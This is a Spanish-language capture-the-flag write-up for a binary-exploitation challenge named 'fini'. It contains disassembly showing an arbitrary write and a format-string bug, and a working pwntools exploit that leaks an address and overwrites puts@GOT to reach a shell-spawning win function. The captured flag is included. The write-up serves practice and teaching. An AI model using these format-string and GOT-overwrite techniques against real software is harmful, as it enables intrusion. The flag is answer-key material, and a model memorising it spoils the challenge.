# fini

A juzgar por el nombre la solucion esperada debe haber estado relacionada con la seccion fini tal vez.

```
[*] '/home/kalcast/Descargas/ctf/PWN/fini/challenge1'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

- El binario no tiene RELRO, asi que la Global Offset Table es modificable.

- En la funcion `main` con la opcion "1" (write) podemos escribir 8 bytes en cualquier direccion:
```
..
|  ||| ::   ; CODE XREF from main @ 0x11ad(x)
|  |`-----> 0x000011d0      488d3d680e..   lea rdi, str.Addr__hex_:    ; 0x203f ; "Addr (hex): " ; const char *format
|  | | ::   0x000011d7      31c0           xor eax, eax
|  | | ::   0x000011d9      4c8d356c0e..   lea r14, str._llx           ; 0x204c ; "%llx"
|  | | ::   0x000011e0      e86bfeffff     call sym.imp.printf         ; int printf(const char *format)
|  | | ::   0x000011e5      31c0           xor eax, eax
|  | | ::   0x000011e7      488d742408     lea rsi, [var_8h]
|  | | ::   0x000011ec      4c89f7         mov rdi, r14                ; const char *format
|  | | ::   0x000011ef      48c7442408..   mov qword [var_8h], 0
|  | | ::   0x000011f8      e883feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|  | | ::   0x000011fd      83f801         cmp eax, 1
|  | |,===< 0x00001200      7545           jne 0x1247
|  | ||::   0x00001202      488d3d520e..   lea rdi, str.Value__hex__8_bytes_: ; 0x205b ; "Value (hex, 8 bytes): " ; const char *format
|  | ||::   0x00001209      31c0           xor eax, eax
|  | ||::   0x0000120b      e840feffff     call sym.imp.printf         ; int printf(const char *format)
|  | ||::   0x00001210      31c0           xor eax, eax
|  | ||::   0x00001212      4c89ee         mov rsi, r13
|  | ||::   0x00001215      4c89f7         mov rdi, r14                ; const char *format
|  | ||::   0x00001218      4889442410     mov qword [var_10h], rax
|  | ||::   0x0000121d      31c0           xor eax, eax
|  | ||::   0x0000121f      e85cfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|  | ||::   0x00001224      83e801         sub eax, 1
|  |,=====< 0x00001227      751e           jne 0x1247
|  ||||::   0x00001229      488b542410     mov rdx, qword [var_10h]
|  ||||::   0x0000122e      488b442408     mov rax, qword [var_8h]
|  ||||::   0x00001233      488d3d380e..   lea rdi, [0x00002072]       ; "ok" ; const char *s
|  ||||::   0x0000123a      488910         mov qword [rax], rdx
|  ||||::   0x0000123d      e8eefdffff     call sym.imp.puts           ; int puts(const char *s)
|  ||||`==< 0x00001242      e937ffffff     jmp 0x117e
```

- En main, al introducir tu nombre y luego mostrartelo con `printf(input)` hay una vulnerabilidad de cadena formateada:
```
|           0x00001122      488d3de30e..   lea rdi, str.Whats_your_name_ ; 0x200c ; "What's your name?" ; const char *s
|           0x00001129      e802ffffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0000112e      488b151b23..   mov rdx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5
|                                                                      ; [0x3450:8]=0 ; FILE *stream
|           0x00001135      be80000000     mov esi, 0x80               ; int size
|           0x0000113a      4c89ef         mov rdi, r13                ; char *s
|           0x0000113d      e81effffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00001142      488d3dd50e..   lea rdi, str.Hello_         ; 0x201e ; "Hello, " ; const char *format
|           0x00001149      31c0           xor eax, eax
|           0x0000114b      e800ffffff     call sym.imp.printf         ; int printf(const char *format)
```

- Tambien tenemos de nuevo una funcion `win` que esta vez ejecuta una shell:
```
[0x00001380]> pdf
/ 12: sym.win ();
|       :   0x00001380      488d3d7d0c..   lea rdi, str._bin_sh        ; 0x2004 ; "/bin/sh"
\       `=< 0x00001387      e9b4fcffff     jmp sym.imp.system
```

---

La estrategia es:
1. Filtrar una direccion del binario
2. Calcular su offset a la entrada de `puts@GOT` y a `win`
3. Reemplazar la entrada de `puts@GOT` por la direccion de `win`
4. Llamar a `puts("bye")` con la opcion "2" (exit) para forzar a que se llame a `win("bye")` en su lugar.

Para filtrar la direccion usamos el operador de formato `%N$p` que nos permite imprimir 8 bytes (los primeros 6 pares desde los registros y el resto desde la pila). Con un depurador puedes añadir un breakpoint en main y observar si hay direcciones validas. 

### Exploit
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./challenge1")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.ac.upt.ro"
port = 9058

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

r.recv()
r.sendline(b"%31$p")
r.recvuntil(b"Hello, ")
main_leak = int(r.recvline().strip(),16)
r.success(f"MAIN_LEAK: {hex(main_leak)}")

puts_got = main_leak + 0x2340
win_addr = main_leak + 0x2d0
r.success(f"PUTS@GOT: {hex(puts_got)}")
r.success(f"WIN ADDR: {hex(win_addr)}")
r.sendline(b"1")
r.sendline(hex(puts_got).encode())
r.sendline(hex(win_addr).encode())
r.interactive()
```

`ctf{c503f30375fd0e91985b4d8f0c9cdc234c8018a8b3e1df3f4d1a126725f47d42}`


